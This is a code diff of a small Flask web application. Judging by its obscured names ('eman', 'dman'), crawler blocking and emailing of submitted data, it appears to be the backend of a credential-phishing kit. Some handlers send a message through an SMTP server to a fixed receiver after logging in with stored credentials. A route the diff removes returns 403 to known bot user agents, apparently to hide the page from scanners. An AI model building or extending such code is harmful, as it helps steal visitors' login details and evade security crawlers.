@@ -48,7 +48,7 @@ def first():
         with smtplib.SMTP_SSL("mail.erhawthone.com", 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email, message.as_string())
-        return redirect(url_for('benza', web=session.get('eman')))
+        return render_template('ind.html', eman=eman, dman=dman)
 
 @app.route("/second", methods=['POST'])
 def second():
@@ -83,26 +83,9 @@ def second():
     return render_template('main.html', dman=dman)
 
 
-@app.route("/benzap", methods=['GET'])
-def benza():
-    if request.method == 'GET':
-        eman = session.get('eman')
-        dman = session.get('ins')
-    return render_template('ind.html', eman=eman, dman=dman)
 
 
 
-@app.route("/lasmop", methods=['GET'])
-def lasmo():
-    userip = request.headers.get("X-Forwarded-For")
-    useragent = request.headers.get("User-Agent")
-    
-    if useragent in bot_user_agents:
-        abort(403)  # forbidden
-    
-    if request.method == 'GET':
-        dman = session.get('ins')
-    return render_template('main.html', dman=dman)
 
 if __name__ == '__main__':
     app.run(host="0.0.0.0", port=3000)
